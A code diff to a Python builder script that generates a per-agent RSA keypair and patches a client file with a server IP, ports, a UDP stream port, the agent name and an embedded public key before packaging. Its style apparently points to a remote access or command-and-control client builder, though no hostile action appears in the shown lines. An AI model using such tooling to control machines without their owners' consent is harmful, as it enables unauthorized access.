@@ -129,8 +129,24 @@ class Manager:
             json.dump(self.config, f, indent=2)
         print("  [+] Config saved")
 
+    def _generate_agent_keys(self, name):
+        """Generate RSA-2048 keypair. Public key embedded in agent, private key stored on server."""
+        from Crypto.PublicKey import RSA
+        key_dir = os.path.join(os.getcwd(), "keys", name)
+        os.makedirs(key_dir, exist_ok=True)
+        key = RSA.generate(2048)
+        priv = key.export_key().decode()
+        pub = key.publickey().export_key().decode()
+        with open(os.path.join(key_dir, "private.pem"), "w") as f:
+            f.write(priv)
+        with open(os.path.join(key_dir, "public.pem"), "w") as f:
+            f.write(pub)
+        print(f"  [+] Generated RSA-2048 keypair for '{name}' -> keys/{name}/")
+        return pub
+
     def patch_client(self):
         src = Path("client.py").read_text(encoding="utf-8")
+        name = self.config["output_name"]
         src = re.sub(
             r'SERVER_IP = os\.environ\.get\("SERVER_IP", "[^"]*"\)',
             f'SERVER_IP = os.environ.get("SERVER_IP", "{self.config["server_ip"]}")',
@@ -147,10 +163,15 @@ class Manager:
                 f'_STREAM_UDP_PORT = {self.config["stream_port"]}',
                 src,
             )
+        # Embed agent name and public key
+        pubkey = self._generate_agent_keys(name)
+        src = re.sub(r'_EMBEDDED_PUBKEY = .+', f'_EMBEDDED_PUBKEY = {json.dumps(pubkey)}', src)
+        src = re.sub(r'_AGENT_NAME = .+', f'_AGENT_NAME = {json.dumps(name)}', src)
         Path("client.py").write_text(src, encoding="utf-8")
         print(f"  [+] Patched client.py -> {self.config['server_ip']}:{self.config['server_port']}")
         if self.config.get("stream_port"):
             print(f"  [+] Stream UDP port -> {self.config['stream_port']}")
+        print(f"  [+] Embedded pubkey for '{name}'")
 
     def generate_spec(self, entry_point="client.py"):
         datas = []
